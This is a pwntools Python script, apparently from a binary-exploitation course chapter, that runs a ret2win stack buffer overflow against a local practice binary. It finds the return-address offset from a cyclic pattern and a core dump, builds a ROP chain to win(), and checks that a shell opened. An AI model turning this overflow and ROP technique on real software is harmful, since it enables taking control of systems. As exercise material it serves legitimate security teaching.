#!/usr/bin/env python3
"""ch05-stack ret2win: overwrite greet()'s saved return address with win().
Discovers the offset at runtime (cyclic pattern + core dump) instead of
hardcoding it, so the same script works unchanged on the AArch64 build
(saved x30, offset 80). `make test` runs this and asserts a real shell."""
import sys
from pwn import *

BIN = sys.argv[1] if len(sys.argv) > 1 else './vuln-x86_64'
context.binary = elf = ELF(BIN)                     # ❶ arch/bits/endian from the ELF
context.log_level = 'warning'
WIN = elf.symbols['win']                            # ❷ no-PIE: a fixed address

def find_offset():
    """Crash greet() with a De Bruijn pattern; recover the offset to the
    saved return address from the resulting core dump."""
    io = process(BIN)
    io.sendafter(b'name> ', cyclic(256, n=context.bytes))   # ❸
    io.wait()
    core = io.corefile
    if context.arch == 'aarch64':
        captured = pack(core.pc)                    # ❹ ret loaded saved x30 into pc
    else:
        captured = core.read(core.sp - context.bytes, context.bytes)
    return cyclic_find(captured, n=context.bytes)   # ❺

def exploit(offset):
    if context.arch == 'aarch64':
        chain = flat({offset: WIN}, filler=b'A')    # ❻ no movaps alignment issue
    else:
        ret = ROP(elf).find_gadget(['ret'])[0]      # ❼ realign for system()'s movaps
        chain = flat({offset: [ret, WIN]}, filler=b'A')
    io = process(BIN)
    io.sendafter(b'name> ', chain)
    io.sendline(b'echo PWNED_$((13*3))')            # ❽ prove the shell executes
    io.recvuntil(b'PWNED_39', timeout=5)
    log.success('%s: ret2win OK at offset %d', BIN, offset)
    io.close()

if __name__ == '__main__':
    exploit(find_offset())
